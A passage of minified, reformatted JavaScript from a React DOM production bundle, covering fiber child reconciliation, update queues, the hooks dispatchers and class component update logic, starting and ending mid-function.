        return e && N.forEach(function(Z) {
            return t(d, Z)
        }), G && on(d, _), C
    }

    function v(d, c, f, x) {
        var C = dr(f);
        if (typeof C != "function") throw Error(T(150));
        if (f = C.call(f), f == null) throw Error(T(151));
        for (var P = C = null, N = c, _ = c = 0, M = null, L = f.next(); N !== null && !L.done; _++, L = f.next()) {
            N.index > _ ? (M = N, N = null) : M = N.sibling;
            var Z = h(d, N, L.value, x);
            if (Z === null) {
                N === null && (N = M);
                break
            }
            e && N && Z.alternate === null && t(d, N), c = i(Z, c, _), P === null ? C = Z : P.sibling = Z, P = Z, N = M
        }
        if (L.done) return n(d, N), G && on(d, _), C;
        if (N === null) {
            for (; !L.done; _++, L = f.next()) L = m(d, L.value, x), L !== null && (c = i(L, c, _), P === null ? C = L : P.sibling = L, P = L);
            return G && on(d, _), C
        }
        for (N = r(d, N); !L.done; _++, L = f.next()) L = w(N, d, _, L.value, x), L !== null && (e && L.alternate !== null && N.delete(L.key === null ? _ : L.key), c = i(L, c, _), P === null ? C = L : P.sibling = L, P = L);
        return e && N.forEach(function(z) {
            return t(d, z)
        }), G && on(d, _), C
    }

    function S(d, c, f, x) {
        if (typeof f == "object" && f !== null && f.type === Nn && f.key === null && (f = f.props.children), typeof f == "object" && f !== null) {
            switch (f.$$typeof) {
                case fo:
                    e: {
                        for (var C = f.key, P = c; P !== null;) {
                            if (P.key === C) {
                                if (C = f.type, C === Nn) {
                                    if (P.tag === 7) {
                                        n(d, P.sibling), c = o(P, f.props.children), c.return = d, d = c;
                                        break e
                                    }
                                } else if (P.elementType === C || typeof C == "object" && C !== null && C.$$typeof === Mt && ha(C) === P.type) {
                                    n(d, P.sibling), c = o(P, f.props), c.ref = yr(d, P, f), c.return = d, d = c;
                                    break e
                                }
                                n(d, P);
                                break
                            } else t(d, P);
                            P = P.sibling
                        }
                        f.type === Nn ? (c = mn(f.props.children, d.mode, x, f.key), c.return = d, d = c) : (x = Wo(f.type, f.key, f.props, null, d.mode, x), x.ref = yr(d, c, f), x.return = d, d = x)
                    }
                    return s(d);
                case Pn:
                    e: {
                        for (P = f.key; c !== null;) {
                            if (c.key === P)
                                if (c.tag === 4 && c.stateNode.containerInfo === f.containerInfo && c.stateNode.implementation === f.implementation) {
                                    n(d, c.sibling), c = o(c, f.children || []), c.return = d, d = c;
                                    break e
                                } else {
                                    n(d, c);
                                    break
                                }
                            else t(d, c);
                            c = c.sibling
                        }
                        c = gs(f, d.mode, x),
                        c.return = d,
                        d = c
                    }
                    return s(d);
                case Mt:
                    return P = f._init, S(d, c, P(f._payload), x)
            }
            if (kr(f)) return k(d, c, f, x);
            if (dr(f)) return v(d, c, f, x);
            Eo(d, f)
        }
        return typeof f == "string" && f !== "" || typeof f == "number" ? (f = "" + f, c !== null && c.tag === 6 ? (n(d, c.sibling), c = o(c, f), c.return = d, d = c) : (n(d, c), c = vs(f, d.mode, x), c.return = d, d = c), s(d)) : n(d, c)
    }
    return S
}
var nr = Od(!0),
    Ld = Od(!1),
    ii = tn(null),
    si = null,
    In = null,
    Gl = null;

function ql() {
    Gl = In = si = null
}

function Yl(e) {
    var t = ii.current;
    K(ii), e._currentValue = t
}

function tl(e, t, n) {
    for (; e !== null;) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t, r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
        e = e.return
    }
}

function $n(e, t) {
    si = e, Gl = In = null, e = e.dependencies, e !== null && e.firstContext !== null && (e.lanes & t && (Te = !0), e.firstContext = null)
}

function He(e) {
    var t = e._currentValue;
    if (Gl !== e)
        if (e = {
                context: e,
                memoizedValue: t,
                next: null
            }, In === null) {
            if (si === null) throw Error(T(308));
            In = e, si.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else In = In.next = e;
    return t
}
var un = null;

function Xl(e) {
    un === null ? un = [e] : un.push(e)
}

function Md(e, t, n, r) {
    var o = t.interleaved;
    return o === null ? (n.next = n, Xl(t)) : (n.next = o.next, o.next = n), t.interleaved = n, Et(e, r)
}

function Et(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null;) e.childLanes |= t, n = e.alternate, n !== null && (n.childLanes |= t), n = e, e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var It = !1;

function Zl(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}

function Id(e, t) {
    e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}

function xt(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}

function Gt(e, t, n) {
    var r = e.updateQueue;
    if (r === null) return null;
    if (r = r.shared, $ & 2) {
        var o = r.pending;
        return o === null ? t.next = t : (t.next = o.next, o.next = t), r.pending = t, Et(e, n)
    }
    return o = r.interleaved, o === null ? (t.next = t, Xl(r)) : (t.next = o.next, o.next = t), r.interleaved = t, Et(e, n)
}

function Ao(e, t, n) {
    if (t = t.updateQueue, t !== null && (t = t.shared, (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes, n |= r, t.lanes = n, Al(e, n)
    }
}

function ma(e, t) {
    var n = e.updateQueue,
        r = e.alternate;
    if (r !== null && (r = r.updateQueue, n === r)) {
        var o = null,
            i = null;
        if (n = n.firstBaseUpdate, n !== null) {
            do {
                var s = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                i === null ? o = i = s : i = i.next = s, n = n.next
            } while (n !== null);
            i === null ? o = i = t : i = i.next = t
        } else o = i = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: o,
            lastBaseUpdate: i,
            shared: r.shared,
            effects: r.effects
        }, e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate, e === null ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t
}

function li(e, t, n, r) {
    var o = e.updateQueue;
    It = !1;
    var i = o.firstBaseUpdate,
        s = o.lastBaseUpdate,
        l = o.shared.pending;
    if (l !== null) {
        o.shared.pending = null;
        var u = l,
            a = u.next;
        u.next = null, s === null ? i = a : s.next = a, s = u;
        var p = e.alternate;
        p !== null && (p = p.updateQueue, l = p.lastBaseUpdate, l !== s && (l === null ? p.firstBaseUpdate = a : l.next = a, p.lastBaseUpdate = u))
    }
    if (i !== null) {
        var m = o.baseState;
        s = 0, p = a = u = null, l = i;
        do {
            var h = l.lane,
                w = l.eventTime;
            if ((r & h) === h) {
                p !== null && (p = p.next = {
                    eventTime: w,
                    lane: 0,
                    tag: l.tag,
                    payload: l.payload,
                    callback: l.callback,
                    next: null
                });
                e: {
                    var k = e,
                        v = l;
                    switch (h = t, w = n, v.tag) {
                        case 1:
                            if (k = v.payload, typeof k == "function") {
                                m = k.call(w, m, h);
                                break e
                            }
                            m = k;
                            break e;
                        case 3:
                            k.flags = k.flags & -65537 | 128;
                        case 0:
                            if (k = v.payload, h = typeof k == "function" ? k.call(w, m, h) : k, h == null) break e;
                            m = X({}, m, h);
                            break e;
                        case 2:
                            It = !0
                    }
                }
                l.callback !== null && l.lane !== 0 && (e.flags |= 64, h = o.effects, h === null ? o.effects = [l] : h.push(l))
            } else w = {
                eventTime: w,
                lane: h,
                tag: l.tag,
                payload: l.payload,
                callback: l.callback,
                next: null
            }, p === null ? (a = p = w, u = m) : p = p.next = w, s |= h;
            if (l = l.next, l === null) {
                if (l = o.shared.pending, l === null) break;
                h = l, l = h.next, h.next = null, o.lastBaseUpdate = h, o.shared.pending = null
            }
        } while (!0);
        if (p === null && (u = m), o.baseState = u, o.firstBaseUpdate = a, o.lastBaseUpdate = p, t = o.shared.interleaved, t !== null) {
            o = t;
            do s |= o.lane, o = o.next; while (o !== t)
        } else i === null && (o.shared.lanes = 0);
        wn |= s, e.lanes = s, e.memoizedState = m
    }
}

function ya(e, t, n) {
    if (e = t.effects, t.effects = null, e !== null)
        for (t = 0; t < e.length; t++) {
            var r = e[t],
                o = r.callback;
            if (o !== null) {
                if (r.callback = null, r = n, typeof o != "function") throw Error(T(191, o));
                o.call(r)
            }
        }
}
var lo = {},
    ft = tn(lo),
    Hr = tn(lo),
    Kr = tn(lo);

function an(e) {
    if (e === lo) throw Error(T(174));
    return e
}

function Jl(e, t) {
    switch (B(Kr, t), B(Hr, e), B(ft, lo), e = t.nodeType, e) {
        case 9:
        case 11:
            t = (t = t.documentElement) ? t.namespaceURI : Ds(null, "");
            break;
        default:
            e = e === 8 ? t.parentNode : t, t = e.namespaceURI || null, e = e.tagName, t = Ds(t, e)
    }
    K(ft), B(ft, t)
}

function rr() {
    K(ft), K(Hr), K(Kr)
}

function Dd(e) {
    an(Kr.current);
    var t = an(ft.current),
        n = Ds(t, e.type);
    t !== n && (B(Hr, e), B(ft, n))
}

function eu(e) {
    Hr.current === e && (K(ft), K(Hr))
}
var q = tn(0);

function ui(e) {
    for (var t = e; t !== null;) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && (n = n.dehydrated, n === null || n.data === "$?" || n.data === "$!")) return t
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128) return t
        } else if (t.child !== null) {
            t.child.return = t, t = t.child;
            continue
        }
        if (t === e) break;
        for (; t.sibling === null;) {
            if (t.return === null || t.return === e) return null;
            t = t.return
        }
        t.sibling.return = t.return, t = t.sibling
    }
    return null
}
var ds = [];

function tu() {
    for (var e = 0; e < ds.length; e++) ds[e]._workInProgressVersionPrimary = null;
    ds.length = 0
}
var zo = Nt.ReactCurrentDispatcher,
    fs = Nt.ReactCurrentBatchConfig,
    gn = 0,
    Y = null,
    oe = null,
    se = null,
    ai = !1,
    jr = !1,
    Gr = 0,
    Wm = 0;

function he() {
    throw Error(T(321))
}

function nu(e, t) {
    if (t === null) return !1;
    for (var n = 0; n < t.length && n < e.length; n++)
        if (!nt(e[n], t[n])) return !1;
    return !0
}

function ru(e, t, n, r, o, i) {
    if (gn = i, Y = t, t.memoizedState = null, t.updateQueue = null, t.lanes = 0, zo.current = e === null || e.memoizedState === null ? Km : Gm, e = n(r, o), jr) {
        i = 0;
        do {
            if (jr = !1, Gr = 0, 25 <= i) throw Error(T(301));
            i += 1, se = oe = null, t.updateQueue = null, zo.current = qm, e = n(r, o)
        } while (jr)
    }
    if (zo.current = ci, t = oe !== null && oe.next !== null, gn = 0, se = oe = Y = null, ai = !1, t) throw Error(T(300));
    return e
}

function ou() {
    var e = Gr !== 0;
    return Gr = 0, e
}

function st() {
    var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
    };
    return se === null ? Y.memoizedState = se = e : se = se.next = e, se
}

function Ke() {
    if (oe === null) {
        var e = Y.alternate;
        e = e !== null ? e.memoizedState : null
    } else e = oe.next;
    var t = se === null ? Y.memoizedState : se.next;
    if (t !== null) se = t, oe = e;
    else {
        if (e === null) throw Error(T(310));
        oe = e, e = {
            memoizedState: oe.memoizedState,
            baseState: oe.baseState,
            baseQueue: oe.baseQueue,
            queue: oe.queue,
            next: null
        }, se === null ? Y.memoizedState = se = e : se = se.next = e
    }
    return se
}

function qr(e, t) {
    return typeof t == "function" ? t(e) : t
}

function ps(e) {
    var t = Ke(),
        n = t.queue;
    if (n === null) throw Error(T(311));
    n.lastRenderedReducer = e;
    var r = oe,
        o = r.baseQueue,
        i = n.pending;
    if (i !== null) {
        if (o !== null) {
            var s = o.next;
            o.next = i.next, i.next = s
        }
        r.baseQueue = o = i, n.pending = null
    }
    if (o !== null) {
        i = o.next, r = r.baseState;
        var l = s = null,
            u = null,
            a = i;
        do {
            var p = a.lane;
            if ((gn & p) === p) u !== null && (u = u.next = {
                lane: 0,
                action: a.action,
                hasEagerState: a.hasEagerState,
                eagerState: a.eagerState,
                next: null
            }), r = a.hasEagerState ? a.eagerState : e(r, a.action);
            else {
                var m = {
                    lane: p,
                    action: a.action,
                    hasEagerState: a.hasEagerState,
                    eagerState: a.eagerState,
                    next: null
                };
                u === null ? (l = u = m, s = r) : u = u.next = m, Y.lanes |= p, wn |= p
            }
            a = a.next
        } while (a !== null && a !== i);
        u === null ? s = r : u.next = l, nt(r, t.memoizedState) || (Te = !0), t.memoizedState = r, t.baseState = s, t.baseQueue = u, n.lastRenderedState = r
    }
    if (e = n.interleaved, e !== null) {
        o = e;
        do i = o.lane, Y.lanes |= i, wn |= i, o = o.next; while (o !== e)
    } else o === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch]
}

function hs(e) {
    var t = Ke(),
        n = t.queue;
    if (n === null) throw Error(T(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch,
        o = n.pending,
        i = t.memoizedState;
    if (o !== null) {
        n.pending = null;
        var s = o = o.next;
        do i = e(i, s.action), s = s.next; while (s !== o);
        nt(i, t.memoizedState) || (Te = !0), t.memoizedState = i, t.baseQueue === null && (t.baseState = i), n.lastRenderedState = i
    }
    return [i, r]
}

function Fd() {}

function Ad(e, t) {
    var n = Y,
        r = Ke(),
        o = t(),
        i = !nt(r.memoizedState, o);
    if (i && (r.memoizedState = o, Te = !0), r = r.queue, iu(Ud.bind(null, n, r, e), [e]), r.getSnapshot !== t || i || se !== null && se.memoizedState.tag & 1) {
        if (n.flags |= 2048, Yr(9, bd.bind(null, n, r, o, t), void 0, null), le === null) throw Error(T(349));
        gn & 30 || zd(n, t, o)
    }
    return o
}

function zd(e, t, n) {
    e.flags |= 16384, e = {
        getSnapshot: t,
        value: n
    }, t = Y.updateQueue, t === null ? (t = {
        lastEffect: null,
        stores: null
    }, Y.updateQueue = t, t.stores = [e]) : (n = t.stores, n === null ? t.stores = [e] : n.push(e))
}

function bd(e, t, n, r) {
    t.value = n, t.getSnapshot = r, $d(t) && Vd(e)
}

function Ud(e, t, n) {
    return n(function() {
        $d(t) && Vd(e)
    })
}

function $d(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !nt(e, n)
    } catch {
        return !0
    }
}

function Vd(e) {
    var t = Et(e, 1);
    t !== null && tt(t, e, 1, -1)
}

function va(e) {
    var t = st();
    return typeof e == "function" && (e = e()), t.memoizedState = t.baseState = e, e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: qr,
        lastRenderedState: e
    }, t.queue = e, e = e.dispatch = Hm.bind(null, Y, e), [t.memoizedState, e]
}

function Yr(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    }, t = Y.updateQueue, t === null ? (t = {
        lastEffect: null,
        stores: null
    }, Y.updateQueue = t, t.lastEffect = e.next = e) : (n = t.lastEffect, n === null ? t.lastEffect = e.next = e : (r = n.next, n.next = e, e.next = r, t.lastEffect = e)), e
}

function Wd() {
    return Ke().memoizedState
}

function bo(e, t, n, r) {
    var o = st();
    Y.flags |= e, o.memoizedState = Yr(1 | t, n, void 0, r === void 0 ? null : r)
}

function _i(e, t, n, r) {
    var o = Ke();
    r = r === void 0 ? null : r;
    var i = void 0;
    if (oe !== null) {
        var s = oe.memoizedState;
        if (i = s.destroy, r !== null && nu(r, s.deps)) {
            o.memoizedState = Yr(t, n, i, r);
            return
        }
    }
    Y.flags |= e, o.memoizedState = Yr(1 | t, n, i, r)
}

function ga(e, t) {
    return bo(8390656, 8, e, t)
}

function iu(e, t) {
    return _i(2048, 8, e, t)
}

function Bd(e, t) {
    return _i(4, 2, e, t)
}

function Qd(e, t) {
    return _i(4, 4, e, t)
}

function Hd(e, t) {
    if (typeof t == "function") return e = e(), t(e),
        function() {
            t(null)
        };
    if (t != null) return e = e(), t.current = e,
        function() {
            t.current = null
        }
}

function Kd(e, t, n) {
    return n = n != null ? n.concat([e]) : null, _i(4, 4, Hd.bind(null, t, e), n)
}

function su() {}

function Gd(e, t) {
    var n = Ke();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && nu(t, r[1]) ? r[0] : (n.memoizedState = [e, t], e)
}

function qd(e, t) {
    var n = Ke();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && nu(t, r[1]) ? r[0] : (e = e(), n.memoizedState = [e, t], e)
}

function Yd(e, t, n) {
    return gn & 21 ? (nt(n, t) || (n = td(), Y.lanes |= n, wn |= n, e.baseState = !0), t) : (e.baseState && (e.baseState = !1, Te = !0), e.memoizedState = n)
}

function Bm(e, t) {
    var n = W;
    W = n !== 0 && 4 > n ? n : 4, e(!0);
    var r = fs.transition;
    fs.transition = {};
    try {
        e(!1), t()
    } finally {
        W = n, fs.transition = r
    }
}

function Xd() {
    return Ke().memoizedState
}

function Qm(e, t, n) {
    var r = Yt(e);
    if (n = {
            lane: r,
            action: n,
            hasEagerState: !1,
            eagerState: null,
            next: null
        }, Zd(e)) Jd(t, n);
    else if (n = Md(e, t, n, r), n !== null) {
        var o = ke();
        tt(n, e, r, o), ef(n, t, r)
    }
}

function Hm(e, t, n) {
    var r = Yt(e),
        o = {
            lane: r,
            action: n,
            hasEagerState: !1,
            eagerState: null,
            next: null
        };
    if (Zd(e)) Jd(t, o);
    else {
        var i = e.alternate;
        if (e.lanes === 0 && (i === null || i.lanes === 0) && (i = t.lastRenderedReducer, i !== null)) try {
            var s = t.lastRenderedState,
                l = i(s, n);
            if (o.hasEagerState = !0, o.eagerState = l, nt(l, s)) {
                var u = t.interleaved;
                u === null ? (o.next = o, Xl(t)) : (o.next = u.next, u.next = o), t.interleaved = o;
                return
            }
        } catch {} finally {}
        n = Md(e, t, o, r), n !== null && (o = ke(), tt(n, e, r, o), ef(n, t, r))
    }
}

function Zd(e) {
    var t = e.alternate;
    return e === Y || t !== null && t === Y
}

function Jd(e, t) {
    jr = ai = !0;
    var n = e.pending;
    n === null ? t.next = t : (t.next = n.next, n.next = t), e.pending = t
}

function ef(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        r &= e.pendingLanes, n |= r, t.lanes = n, Al(e, n)
    }
}
var ci = {
        readContext: He,
        useCallback: he,
        useContext: he,
        useEffect: he,
        useImperativeHandle: he,
        useInsertionEffect: he,
        useLayoutEffect: he,
        useMemo: he,
        useReducer: he,
        useRef: he,
        useState: he,
        useDebugValue: he,
        useDeferredValue: he,
        useTransition: he,
        useMutableSource: he,
        useSyncExternalStore: he,
        useId: he,
        unstable_isNewReconciler: !1
    },
    Km = {
        readContext: He,
        useCallback: function(e, t) {
            return st().memoizedState = [e, t === void 0 ? null : t], e
        },
        useContext: He,
        useEffect: ga,
        useImperativeHandle: function(e, t, n) {
            return n = n != null ? n.concat([e]) : null, bo(4194308, 4, Hd.bind(null, t, e), n)
        },
        useLayoutEffect: function(e, t) {
            return bo(4194308, 4, e, t)
        },
        useInsertionEffect: function(e, t) {
            return bo(4, 2, e, t)
        },
        useMemo: function(e, t) {
            var n = st();
            return t = t === void 0 ? null : t, e = e(), n.memoizedState = [e, t], e
        },
        useReducer: function(e, t, n) {
            var r = st();
            return t = n !== void 0 ? n(t) : t, r.memoizedState = r.baseState = t, e = {
                pending: null,
                interleaved: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: e,
                lastRenderedState: t
            }, r.queue = e, e = e.dispatch = Qm.bind(null, Y, e), [r.memoizedState, e]
        },
        useRef: function(e) {
            var t = st();
            return e = {
                current: e
            }, t.memoizedState = e
        },
        useState: va,
        useDebugValue: su,
        useDeferredValue: function(e) {
            return st().memoizedState = e
        },
        useTransition: function() {
            var e = va(!1),
                t = e[0];
            return e = Bm.bind(null, e[1]), st().memoizedState = e, [t, e]
        },
        useMutableSource: function() {},
        useSyncExternalStore: function(e, t, n) {
            var r = Y,
                o = st();
            if (G) {
                if (n === void 0) throw Error(T(407));
                n = n()
            } else {
                if (n = t(), le === null) throw Error(T(349));
                gn & 30 || zd(r, t, n)
            }
            o.memoizedState = n;
            var i = {
                value: n,
                getSnapshot: t
            };
            return o.queue = i, ga(Ud.bind(null, r, i, e), [e]), r.flags |= 2048, Yr(9, bd.bind(null, r, i, n, t), void 0, null), n
        },
        useId: function() {
            var e = st(),
                t = le.identifierPrefix;
            if (G) {
                var n = wt,
                    r = gt;
                n = (r & ~(1 << 32 - et(r) - 1)).toString(32) + n, t = ":" + t + "R" + n, n = Gr++, 0 < n && (t += "H" + n.toString(32)), t += ":"
            } else n = Wm++, t = ":" + t + "r" + n.toString(32) + ":";
            return e.memoizedState = t
        },
        unstable_isNewReconciler: !1
    },
    Gm = {
        readContext: He,
        useCallback: Gd,
        useContext: He,
        useEffect: iu,
        useImperativeHandle: Kd,
        useInsertionEffect: Bd,
        useLayoutEffect: Qd,
        useMemo: qd,
        useReducer: ps,
        useRef: Wd,
        useState: function() {
            return ps(qr)
        },
        useDebugValue: su,
        useDeferredValue: function(e) {
            var t = Ke();
            return Yd(t, oe.memoizedState, e)
        },
        useTransition: function() {
            var e = ps(qr)[0],
                t = Ke().memoizedState;
            return [e, t]
        },
        useMutableSource: Fd,
        useSyncExternalStore: Ad,
        useId: Xd,
        unstable_isNewReconciler: !1
    },
    qm = {
        readContext: He,
        useCallback: Gd,
        useContext: He,
        useEffect: iu,
        useImperativeHandle: Kd,
        useInsertionEffect: Bd,
        useLayoutEffect: Qd,
        useMemo: qd,
        useReducer: hs,
        useRef: Wd,
        useState: function() {
            return hs(qr)
        },
        useDebugValue: su,
        useDeferredValue: function(e) {
            var t = Ke();
            return oe === null ? t.memoizedState = e : Yd(t, oe.memoizedState, e)
        },
        useTransition: function() {
            var e = hs(qr)[0],
                t = Ke().memoizedState;
            return [e, t]
        },
        useMutableSource: Fd,
        useSyncExternalStore: Ad,
        useId: Xd,
        unstable_isNewReconciler: !1
    };

function qe(e, t) {
    if (e && e.defaultProps) {
        t = X({}, t), e = e.defaultProps;
        for (var n in e) t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}

function nl(e, t, n, r) {
    t = e.memoizedState, n = n(r, t), n = n == null ? t : X({}, t, n), e.memoizedState = n, e.lanes === 0 && (e.updateQueue.baseState = n)
}
var Ri = {
    isMounted: function(e) {
        return (e = e._reactInternals) ? En(e) === e : !1
    },
    enqueueSetState: function(e, t, n) {
        e = e._reactInternals;
        var r = ke(),
            o = Yt(e),
            i = xt(r, o);
        i.payload = t, n != null && (i.callback = n), t = Gt(e, i, o), t !== null && (tt(t, e, o, r), Ao(t, e, o))
    },
    enqueueReplaceState: function(e, t, n) {
        e = e._reactInternals;
        var r = ke(),
            o = Yt(e),
            i = xt(r, o);
        i.tag = 1, i.payload = t, n != null && (i.callback = n), t = Gt(e, i, o), t !== null && (tt(t, e, o, r), Ao(t, e, o))
    },
    enqueueForceUpdate: function(e, t) {
        e = e._reactInternals;
        var n = ke(),
            r = Yt(e),
            o = xt(n, r);
        o.tag = 2, t != null && (o.callback = t), t = Gt(e, o, r), t !== null && (tt(t, e, r, n), Ao(t, e, r))
    }
};

function wa(e, t, n, r, o, i, s) {
    return e = e.stateNode, typeof e.shouldComponentUpdate == "function" ? e.shouldComponentUpdate(r, i, s) : t.prototype && t.prototype.isPureReactComponent ? !Vr(n, r) || !Vr(o, i) : !0
}

function tf(e, t, n) {
    var r = !1,
        o = Jt,
        i = t.contextType;
    return typeof i == "object" && i !== null ? i = He(i) : (o = Re(t) ? yn : ge.current, r = t.contextTypes, i = (r = r != null) ? er(e, o) : Jt), t = new t(n, i), e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null, t.updater = Ri, e.stateNode = t, t._reactInternals = e, r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = o, e.__reactInternalMemoizedMaskedChildContext = i), t
}

function xa(e, t, n, r) {
    e = t.state, typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r), typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r), t.state !== e && Ri.enqueueReplaceState(t, t.state, null)
}

function rl(e, t, n, r) {
    var o = e.stateNode;
    o.props = n, o.state = e.memoizedState, o.refs = {}, Zl(e);
    var i = t.contextType;
    typeof i == "object" && i !== null ? o.context = He(i) : (i = Re(t) ? yn : ge.current, o.context = er(e, i)), o.state = e.memoizedState, i = t.getDerivedStateFromProps, typeof i == "function" && (nl(e, t, i, n), o.state = e.memoizedState), typeof t.getDerivedStateFromProps == "function" || typeof o.getSnapshotBeforeUpdate == "function" || typeof o.UNSAFE_componentWillMount != "function" && typeof o.componentWillMount != "function" || (t = o.state, typeof o.componentWillMount == "function" && o.componentWillMount(), typeof o.UNSAFE_componentWillMount == "function" && o.UNSAFE_componentWillMount(), t !== o.state && Ri.enqueueReplaceState(o, o.state, null), li(e, n, o, r), o.state = e.memoizedState), typeof o.componentDidMount == "function" && (e.flags |= 4194308)
}

function or(e, t) {
    try {
        var n = "",
            r = t;
        do n += Eh(r), r = r.return; while (r);
        var o = n
    } catch (i) {
        o = `
Error generating stack: ` + i.message + `
` + i.stack
    }
    return {
        value: e,
        source: t,
        stack: o,
        digest: null
    }
}

function ms(e, t, n) {
    return {
        value: e,
        source: null,
        stack: n ? ? null,
        digest: t ? ? null
    }
}

function ol(e, t) {
    try {
        console.error(t.value)
    } catch (n) {
        setTimeout(function() {
            throw n
        })
    }
}
var Ym = typeof WeakMap == "function" ? WeakMap : Map;

function nf(e, t, n) {
    n = xt(-1, n), n.tag = 3, n.payload = {
        element: null
    };
    var r = t.value;
    return n.callback = function() {
        fi || (fi = !0, hl = r), ol(e, t)
    }, n
}

function rf(e, t, n) {
    n = xt(-1, n), n.tag = 3;
    var r = e.type.getDerivedStateFromError;
    if (typeof r == "function") {
        var o = t.value;
        n.payload = function() {
            return r(o)
        }, n.callback = function() {
            ol(e, t)
        }
    }
    var i = e.stateNode;
    return i !== null && typeof i.componentDidCatch == "function" && (n.callback = function() {
        ol(e, t), typeof r != "function" && (qt === null ? qt = new Set([this]) : qt.add(this));
        var s = t.stack;
        this.componentDidCatch(t.value, {
            componentStack: s !== null ? s : ""
        })
    }), n
}

function Sa(e, t, n) {
    var r = e.pingCache;
    if (r === null) {
        r = e.pingCache = new Ym;
        var o = new Set;
        r.set(t, o)
    } else o = r.get(t), o === void 0 && (o = new Set, r.set(t, o));
    o.has(n) || (o.add(n), e = cy.bind(null, e, t, n), t.then(e, e))
}

function ka(e) {
    do {
        var t;
        if ((t = e.tag === 13) && (t = e.memoizedState, t = t !== null ? t.dehydrated !== null : !0), t) return e;
        e = e.return
    } while (e !== null);
    return null
}

function Ea(e, t, n, r, o) {
    return e.mode & 1 ? (e.flags |= 65536, e.lanes = o, e) : (e === t ? e.flags |= 65536 : (e.flags |= 128, n.flags |= 131072, n.flags &= -52805, n.tag === 1 && (n.alternate === null ? n.tag = 17 : (t = xt(-1, 1), t.tag = 2, Gt(n, t, 1))), n.lanes |= 1), e)
}
var Xm = Nt.ReactCurrentOwner,
    Te = !1;

function xe(e, t, n, r) {
    t.child = e === null ? Ld(t, null, n, r) : nr(t, e.child, n, r)
}

function Ca(e, t, n, r, o) {
    n = n.render;
    var i = t.ref;
    return $n(t, o), r = ru(e, t, n, r, i, o), n = ou(), e !== null && !Te ? (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, Ct(e, t, o)) : (G && n && Ql(t), t.flags |= 1, xe(e, t, r, o), t.child)
}

function Pa(e, t, n, r, o) {
    if (e === null) {
        var i = n.type;
        return typeof i == "function" && !hu(i) && i.defaultProps === void 0 && n.compare === null && n.defaultProps === void 0 ? (t.tag = 15, t.type = i, of (e, t, i, r, o)) : (e = Wo(n.type, null, r, t, t.mode, o), e.ref = t.ref, e.return = t, t.child = e)
    }
    if (i = e.child, !(e.lanes & o)) {
        var s = i.memoizedProps;
        if (n = n.compare, n = n !== null ? n : Vr, n(s, r) && e.ref === t.ref) return Ct(e, t, o)
    }
    return t.flags |= 1, e = Xt(i, r), e.ref = t.ref, e.return = t, t.child = e
}

function of (e, t, n, r, o) {
    if (e !== null) {
        var i = e.memoizedProps;
        if (Vr(i, r) && e.ref === t.ref)
            if (Te = !1, t.pendingProps = r = i, (e.lanes & o) !== 0) e.flags & 131072 && (Te = !0);
            else return t.lanes = e.lanes, Ct(e, t, o)
    }
    return il(e, t, n, r, o)
}

function sf(e, t, n) {
    var r = t.pendingProps,
        o = r.children,
        i = e !== null ? e.memoizedState : null;
    if (r.mode === "hidden")
        if (!(t.mode & 1)) t.memoizedState = {
            baseLanes: 0,
            cachePool: null,
            transitions: null
        }, B(Fn, Me), Me |= n;
        else {
            if (!(n & 1073741824)) return e = i !== null ? i.baseLanes | n : n, t.lanes = t.childLanes = 1073741824, t.memoizedState = {
                baseLanes: e,
                cachePool: null,
                transitions: null
            }, t.updateQueue = null, B(Fn, Me), Me |= e, null;
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            }, r = i !== null ? i.baseLanes : n, B(Fn, Me), Me |= r
        }
    else i !== null ? (r = i.baseLanes | n, t.memoizedState = null) : r = n, B(Fn, Me), Me |= r;
    return xe(e, t, o, n), t.child
}

function lf(e, t) {
    var n = t.ref;
    (e === null && n !== null || e !== null && e.ref !== n) && (t.flags |= 512, t.flags |= 2097152)
}

function il(e, t, n, r, o) {
    var i = Re(n) ? yn : ge.current;
